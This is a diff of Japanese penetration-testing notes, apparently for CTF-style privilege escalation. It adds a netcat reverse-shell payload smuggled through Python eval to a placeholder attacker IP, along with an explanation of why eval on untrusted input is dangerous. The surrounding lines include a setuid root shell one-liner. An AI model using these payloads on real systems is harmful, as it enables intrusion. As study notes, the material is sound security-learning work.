@@ -608,6 +608,10 @@ ex: これで、python がでてきたら。
 
 python -c 'import os; os.setuid(0); os.system("/bin/bash")'
 
+(eval の場合、 `__import__('os').system('nc your_ip port -e /bin/sh')` のように書く)
+ 
+
+
 ```
 
 上記でpython 以外が出てきたら、[gtfobins](https://gtfobins.github.io/) から、該当のコマンドを探す。
@@ -1240,10 +1244,26 @@ where /r . user.txt
 → ex: wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
 
 
+- eval 関数について
+
+eval関数は、引数に指定した文字列をpythonプログラムコードとして評価・実行する機能をもつ関数となる。
+特に組み込みのeval関数では、悪意のあるユーザーから受け取った文字列をプログラムとして実行してしまいシステムに侵入される等の脆弱性、危険性がある。
+そのため外部からの文字列を受け取る場合、組み込みのeval関数は使用してはならない。
+
+```
+例）pythonからLinuxのコマンドを実行出来てしまう、、、
+
+>>> eval("__import__('os').system('uname -a')", {})
+Linux ubuntu 4.4.0-17763-................
+
+```
+
+
 
 - 改行などがうまく表示できていない時
 
 /bin/sh^M : bad interpreter: No such file or directory 
 
 `dos2unix ファイル名`
+
 
